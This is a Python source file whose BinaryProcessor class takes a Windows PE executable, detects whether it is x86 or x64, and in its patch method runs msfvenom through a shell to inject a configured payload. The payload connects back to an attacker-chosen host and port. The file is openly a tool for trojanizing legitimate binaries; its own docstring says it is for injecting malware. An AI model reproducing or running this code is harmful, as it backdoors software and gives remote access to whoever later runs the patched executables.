#  Copyright (c) 2021 - Darsh Patel
#  All rights reserved.
#  Redistribution and use in source and binary forms, with or without modification,
#  are permitted provided that the following conditions are met:
#      1. Redistributions of source code must retain the above copyright notice,
#      this list of conditions and the following disclaimer.
#      2. Redistributions in binary form must reproduce the above copyright notice,
#      this list of conditions and the following disclaimer in the documentation
#      and/or other materials provided with the distribution.
#      3. Neither the name of the copyright holder nor the names of its contributors
#      may be used to endorse or promote products derived from this software without
#      specific prior written permission.
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
#  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
#  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
#  CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
#  SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
#  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
#  CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
#  ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
#  POSSIBILITY OF SUCH DAMAGE.

import logging
import subprocess
import tempfile

import pefile

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)


class BinaryProcessor:
    def __init__(self, binary_content, config):
        self.arch = 'unknown'
        self.logger = logger
        self.binary_content = binary_content
        self.binary_format = self.check_binary_format(self.binary_content)
        self.file = None
        self.config = config

    def detect_arch(self):
        """
        Detects the architecture of the binary using pefile
        :return:
        """
        pe = pefile.PE(self.file.name)
        magic_header = hex(pe.OPTIONAL_HEADER.Magic)
        self.logger.info(f"Found Header: {magic_header}")
        if magic_header == '0x10b':
            self.arch = 'x86'
        elif magic_header == '0x20b':
            self.arch = 'x64'

    def save(self):
        """
        Saves the binary file to a temporary location
        """
        self.file = tempfile.NamedTemporaryFile()
        self.file.write(self.binary_content)
        self.file.flush()
        self.file.seek(0)
        self.logger.info(f"Saved Binary as: {self.file.name}")

    @staticmethod
    def check_binary_format(_bytes) -> None or str:
        """
        Checks the magic bytes of a binary string to determine file format
        :param _bytes: byte string of a binary
        :return: String Containing format of the binary
        """
        magic_bytes = {
            b'MZ': 'pe',
            b'cffaedfe': 'machox64',
        }
        if _bytes[0:2] in magic_bytes:
            return magic_bytes[_bytes[0:2]]
        elif _bytes[0:8] in magic_bytes:
            return magic_bytes[_bytes[0:8]]
        else:
            return None

    def patch(self) -> bool:
        """
        Processes Binary files to inject malware payload
        :return: Patch status bool
        """
        result = False
        try:
            self.detect_arch()
            self.logger.info(f"Binary Architecture: {self.arch}")
            if self.binary_format == 'pe' and self.arch != 'unknown':
                logger.info("Injecting Malware in Binary using msfvenom")

                payload = self.config['payload_win32'] if self.arch == 'x86' \
                    else self.config['payload_win64']
                output = subprocess.run(
                    f"msfvenom -a {self.arch} --platform windows -x {self.file.name} "
                    f"-k -p {payload} lhost={self.config['payload_host']} lport="
                    f"{self.config['payload_port']} "
                    f"-f exe -o {self.file.name + '_patched'}",
                    shell=True, check=True)
                result = True if output.returncode == 0 else False
            else:
                self.logger.error("Invalid Binary")
                return False
        except Exception as e:
            self.logger.exception(e)

        return result
